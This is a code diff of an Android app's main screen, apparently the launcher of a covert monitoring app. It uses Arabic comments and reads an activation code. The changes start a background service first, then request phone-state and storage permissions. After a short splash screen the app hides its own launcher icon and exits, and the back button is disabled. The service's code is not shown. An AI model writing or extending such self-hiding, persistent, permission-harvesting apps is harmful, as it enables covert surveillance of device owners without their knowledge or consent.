@@ -3,7 +3,6 @@ package com.sec.check;
 import android.Manifest;
 import android.app.Activity;
 import android.content.ComponentName;
-import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -43,41 +42,74 @@ public class MainActivity extends Activity {
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.READ_EXTERNAL_STORAGE,
         Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.POST_NOTIFICATIONS,
     };
+
+    private String activationCode = "";
+    private boolean permissionsRequested = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        Log.d(TAG, "App started");
+        Log.d(TAG, "=== MainActivity started ===");
 
-        // ★★★ اقرأ الكود من BuildConfig ★★★
-        String activationCode = BuildConfig.ACTIVATION_CODE;
-        
-        // إذا كان فارغاً، استخدم القيمة المحفوظة
-        if (activationCode == null || activationCode.isEmpty() || activationCode.equals("DEFAULT")) {
+        // اقرأ الكود من BuildConfig
+        String code = "DEFAULT";
+        try {
+            code = BuildConfig.ACTIVATION_CODE;
+            Log.d(TAG, "BuildConfig code: " + code);
+        } catch (Exception e) {
+            Log.e(TAG, "BuildConfig error: " + e.getMessage());
+        }
+
+        if (code == null || code.isEmpty() || code.equals("DEFAULT")) {
             SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
             activationCode = sp.getString(KEY_CODE, "");
-        }
-        
-        // احفظ الكود
-        if (activationCode != null && !activationCode.isEmpty()) {
-            SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
-            sp.edit().putString(KEY_CODE, activationCode).apply();
-            Log.d(TAG, "Activation code: " + activationCode);
-        }
-
-        requestPermissions();
-
-        // ابدأ التطبيق مباشرة
-        if (activationCode != null && !activationCode.isEmpty() && !activationCode.equals("DEFAULT")) {
-            showSplashAndStart();
+            Log.d(TAG, "Using saved code: " + activationCode);
         } else {
-            // لا يوجد كود — عرض شاشة بسيطة
-            showErrorScreen();
+            activationCode = code;
+            SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
+            sp.edit().putString(KEY_CODE, code).apply();
+            Log.d(TAG, "Saved new code: " + code);
         }
+
+        // ★★★ ابدأ الخدمة أولاً ★★★
+        startServiceNow();
+
+        // ★★★ ثم اطلب الأذونات ★★★
+        requestPermissionsAndWait();
     }
 
-    private void showSplashAndStart() {
+    private void requestPermissionsAndWait() {
+        if (Build.VERSION.SDK_INT < 23) {
+            // لا يحتاج أذونات
+            showSplashAndFinish();
+            return;
+        }
+
+        List<String> need = new ArrayList<>();
+        for (String p : PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                need.add(p);
+            }
+        }
+
+        Log.d(TAG, "Permissions needed: " + need.size());
+
+        if (need.isEmpty()) {
+            // كل الأذونات موجودة
+            showSplashAndFinish();
+            return;
+        }
+
+        permissionsRequested = true;
+        ActivityCompat.requestPermissions(this, need.toArray(new String[0]), PERMISSION_REQUEST);
+
+        // ★★★ اعرض شاشة توضيحية ★★★
+        showSplashAndFinish();
+    }
+
+    private void showSplashAndFinish() {
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
         root.setBackgroundColor(Color.parseColor("#f5f7fa"));
@@ -99,52 +131,7 @@ public class MainActivity extends Activity {
 
         setContentView(root);
 
-        // بعد ثانية — ابدأ التطبيق
-        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                startApp();
-            }
-        }, 1500);
-    }
-
-    private void showErrorScreen() {
-        LinearLayout root = new LinearLayout(this);
-        root.setOrientation(LinearLayout.VERTICAL);
-        root.setBackgroundColor(Color.parseColor("#f5f7fa"));
-        root.setGravity(Gravity.CENTER);
-
-        TextView msg = new TextView(this);
-        msg.setText("⚠️\nthe application is not activated");
-        msg.setTextSize(16);
-        msg.setTextColor(Color.parseColor("#e11d48"));
-        msg.setGravity(Gravity.CENTER);
-        root.addView(msg);
-
-        setContentView(root);
-
-        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                finish();
-            }
-        }, 2000);
-    }
-
-    private void startApp() {
-        try {
-            Intent svc = new Intent(this, ServiceRunner.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(svc);
-            } else {
-                startService(svc);
-            }
-            Log.d(TAG, "Service started");
-        } catch (Exception e) {
-            Log.e(TAG, "Start service error: " + e.getMessage());
-        }
-
-        // اخفِ الأيقونة واخرج
+        // ★★★ اخفِ بعد 5 ثواني (مدة كافية لقراءة الإشعار) ★★★
         new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -155,20 +142,20 @@ public class MainActivity extends Activity {
                     finish();
                 }
             }
-        }, 500);
+        }, 5000);
     }
 
-    private void requestPermissions() {
-        if (Build.VERSION.SDK_INT < 23) return;
-
-        List<String> need = new ArrayList<>();
-        for (String p : PERMISSIONS) {
-            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                need.add(p);
+    private void startServiceNow() {
+        try {
+            Intent svc = new Intent(this, ServiceRunner.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(svc);
+            } else {
+                startService(svc);
             }
-        }
-        if (!need.isEmpty()) {
-            ActivityCompat.requestPermissions(this, need.toArray(new String[0]), PERMISSION_REQUEST);
+            Log.d(TAG, "Service started");
+        } catch (Exception e) {
+            Log.e(TAG, "Start service error: " + e.getMessage());
         }
     }
 
@@ -186,6 +173,15 @@ public class MainActivity extends Activity {
     }
 
     @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        Log.d(TAG, "=== Permissions result received ===");
+        for (int i = 0; i < permissions.length; i++) {
+            Log.d(TAG, permissions[i] + " -> " + (grantResults[i] == PackageManager.PERMISSION_GRANTED ? "GRANTED" : "DENIED"));
+        }
+    }
+
+    @Override
     public void onBackPressed() {
     }
-}
+                }
